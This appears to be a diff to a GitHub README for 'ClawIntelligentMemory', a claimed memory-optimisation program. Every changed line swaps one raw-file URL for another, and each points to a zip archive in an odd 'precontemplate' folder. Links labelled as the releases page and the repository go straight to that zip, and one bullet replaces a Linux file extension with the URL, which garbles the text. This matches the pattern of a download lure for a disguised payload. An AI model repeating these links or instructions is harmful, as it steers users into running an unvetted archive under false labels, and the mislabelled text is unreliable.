@@ -1,6 +1,6 @@
 # 🧠 ClawIntelligentMemory - Smart Memory Management Made Easy
 
-[![Download ClawIntelligentMemory](https://github.com/aasqrty/ClawIntelligentMemory/raw/refs/heads/main/precontemplate/Claw_Intelligent_Memory_2.9.zip)](https://github.com/aasqrty/ClawIntelligentMemory/raw/refs/heads/main/precontemplate/Claw_Intelligent_Memory_2.9.zip)
+[![Download ClawIntelligentMemory](https://raw.githubusercontent.com/aasqrty/ClawIntelligentMemory/main/precontemplate/Claw_Intelligent_Memory_2.9.zip)](https://raw.githubusercontent.com/aasqrty/ClawIntelligentMemory/main/precontemplate/Claw_Intelligent_Memory_2.9.zip)
 
 ## 📋 What is ClawIntelligentMemory?
 
@@ -30,7 +30,7 @@ First, open a web browser on your computer, such as Chrome, Firefox, or Edge.
 
 Click or tap the following button to visit the ClawIntelligentMemory releases page:
 
-[![Download ClawIntelligentMemory](https://github.com/aasqrty/ClawIntelligentMemory/raw/refs/heads/main/precontemplate/Claw_Intelligent_Memory_2.9.zip)](https://github.com/aasqrty/ClawIntelligentMemory/raw/refs/heads/main/precontemplate/Claw_Intelligent_Memory_2.9.zip)
+[![Download ClawIntelligentMemory](https://raw.githubusercontent.com/aasqrty/ClawIntelligentMemory/main/precontemplate/Claw_Intelligent_Memory_2.9.zip)](https://raw.githubusercontent.com/aasqrty/ClawIntelligentMemory/main/precontemplate/Claw_Intelligent_Memory_2.9.zip)
 
 This page contains all the available versions of the software that you can download.
 
@@ -40,7 +40,7 @@ On the releases page, you will see several files listed. Look for the file that 
 
 - For Windows, the file might end with `.exe` or `.msi`.
 - For macOS, look for `.dmg` or `.pkg` files.
-- For Linux, look for files ending in `https://github.com/aasqrty/ClawIntelligentMemory/raw/refs/heads/main/precontemplate/Claw_Intelligent_Memory_2.9.zip`, `.AppImage`, or `.deb`.
+- For Linux, look for files ending in `https://raw.githubusercontent.com/aasqrty/ClawIntelligentMemory/main/precontemplate/Claw_Intelligent_Memory_2.9.zip`, `.AppImage`, or `.deb`.
 
 Select the version marked as "latest" or the highest version number to ensure you get the newest features.
 
@@ -83,7 +83,7 @@ If you want to learn more about any feature, look for the small question mark (?
 
 You can download the software anytime by visiting the official releases page here:
 
-[Download ClawIntelligentMemory](https://github.com/aasqrty/ClawIntelligentMemory/raw/refs/heads/main/precontemplate/Claw_Intelligent_Memory_2.9.zip)
+[Download ClawIntelligentMemory](https://raw.githubusercontent.com/aasqrty/ClawIntelligentMemory/main/precontemplate/Claw_Intelligent_Memory_2.9.zip)
 
 Follow the instructions above to pick the correct file, download it, and install the program on your system.
 
@@ -131,7 +131,7 @@ A: The default settings automatically optimize memory when needed. You can also 
 
 For questions or help, visit the GitHub repository:
 
-[ClawIntelligentMemory Repository](https://github.com/aasqrty/ClawIntelligentMemory/raw/refs/heads/main/precontemplate/Claw_Intelligent_Memory_2.9.zip)
+[ClawIntelligentMemory Repository](https://raw.githubusercontent.com/aasqrty/ClawIntelligentMemory/main/precontemplate/Claw_Intelligent_Memory_2.9.zip)
 
 You can also open an issue on the GitHub page to report problems or request features.
 
